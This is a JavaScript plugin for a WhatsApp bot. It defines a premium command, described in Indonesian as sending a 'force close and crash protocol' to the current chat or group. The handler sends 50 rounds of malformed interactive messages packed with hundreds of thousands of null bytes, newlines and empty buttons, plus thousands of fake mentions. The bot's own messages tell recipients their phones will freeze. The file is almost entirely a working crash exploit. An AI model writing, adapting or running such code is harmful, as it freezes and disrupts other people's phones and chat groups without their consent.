import { generateWAMessageFromContent } from "ichigo"
import te from '../../src/lib/ichigo-error.js'

const pluginConfig = {
    name: 'fcnew',
    alias: ['forceclosenew', 'forceclose'],
    category: 'tools',
    description: 'Mengirimkan protokol force close dan crash terbaru langsung ke chat atau grup saat ini',
    usage: '.fcnew',
    example: '.fcnew',
    isOwner: false,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    cooldown: 500,
    energi: 20,
    isEnabled: true
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

async function handler(m, { sock, conn }) {
    const cli = conn || sock || m.sock
    if (!cli) return m.reply("Socket-nya gak ada, gak bisa ngirim apa-apa...")

    const target = m.chat

    if (m.react) await m.react('🎸').catch(() => {})

    try {
        if (typeof generateWAMessageFromContent !== "function") {
            throw new Error("Function generateWAMessageFromContent gak ketemu.")
        }

        // Loading typing
        await cli.presenceSubscribe(target).catch(() => {})
        await cli.sendPresenceUpdate('composing', target).catch(() => {})
        await delay(1200)

        await cli.sendMessage(target, {
            text: `Mulai ngirim beban data sampah ke ruangan ini ya... Jangan protes kalau HP kalian langsung ngadat.`
        }, { quoted: m }).catch(() => {})

        const bigStr = "\0".repeat(40000) + " _~X ".repeat(40000);
        const fakeMentions = Array.from({ length: 2000 }, (_, i) => i + 62 + "@s.whatsapp.net");
        const vcard = "\0¬".repeat(20000);

        for (let i = 0; i < 50; i++) {
            const payload1 = generateWAMessageFromContent(target, {
                interactiveMessage: {
                    body: { text: " Z  | Rènn ForceClose-  _~P~I _~P~I _~P~I _~P~I " + bigStr.slice(0, 1000) },
                    contextInfo: {
                        mentionedJid: fakeMentions,
                        quotedMessage: { contactMessage: { displayName: "Rènn Lovers " + bigStr.slice(0, 200), vcard } },
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 20000 }, () => ({ name: "cta_copy" })),
                        messageParamsJson: bigStr.slice(0, 2000),
                    },
                    footer: { text: bigStr.slice(0, 1000) },
                }
            }, {});

            const payload3 = generateWAMessageFromContent(target, {
                viewOnceMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: { text: " _~M  O~] J Rènn Is Here?ⲣ Yᬭ _   " + bigStr.slice(0, 1000) },
                            nativeFlowMessage: { buttons: "\n".repeat(250000) + "\0".repeat(250000) },
                        },
                    },
                }
            }, {});

            const payload4 = generateWAMessageFromContent(target, {
                interactiveMessage: {
                    body: { text: "\n".repeat(250000) + "\0".repeat(250000) },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 300000 }, () => ({})),
                        nativeFlowResponseMessage: { buttons: Array.from({ length: 300000 }, () => ({})) },
                    },
                }
            }, {});

            await cli.relayMessage(target, payload1.message, { messageId: payload1.key.id, noSelfSync: true, cacheDuringPreKey: false }).catch(() => {});
            await cli.relayMessage(target, payload3.message, { messageId: payload3.key.id, noSelfSync: true, cacheDuringPreKey: false }).catch(() => {});
            await cli.relayMessage(target, payload4.message, { messageId: payload4.key.id, noSelfSync: true, cacheDuringPreKey: false }).catch(() => {});

            const ctxInfo = { mentionedJid: fakeMentions, isForwarded: true, forwardingScore: 999999 };
            await cli.sendMessage(target, { text: bigStr + bigStr, contextInfo: ctxInfo }, { noSelfSync: true }).catch(() => {});

            await delay(30);
        }

        await cli.sendPresenceUpdate('paused', target).catch(() => {})
        if (m.react) await m.react('✅').catch(() => {})

        await cli.sendMessage(target, {
            text: `Selesai. Semua paketnya udah tumpah. Kalau masih ada yang selamat, berarti emang hoki mereka lagi bagus.`
        }, { quoted: m }).catch(() => {})

    } catch (e) {
        console.error("[fcnew plugin error]", e)
        if (m.react) await m.react('☢').catch(() => {})
        return m.reply(te(m.prefix, m.command, m.pushName))
    }
}

export { pluginConfig as config, handler }
export default { config: pluginConfig, handler }